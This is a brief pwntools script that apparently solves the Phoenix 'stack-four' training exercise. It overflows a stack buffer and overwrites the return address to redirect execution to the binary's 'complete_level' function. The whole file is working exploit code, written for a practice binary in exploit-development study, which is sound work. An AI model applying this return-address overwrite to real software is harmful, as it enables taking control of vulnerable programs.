#!/usr/bin/env python3
from pwn import *

context.log_level = "critical"

io = process("/opt/phoenix/amd64/stack-four")
elf = io.elf
payload = b"A" * cyclic_find(0x61616177) + p64(elf.symbols["complete_level"])
io.sendline(payload)
print(io.recvline().decode("ascii"))
print(io.recvline().decode("ascii"))
print(io.recvline().decode("ascii"))
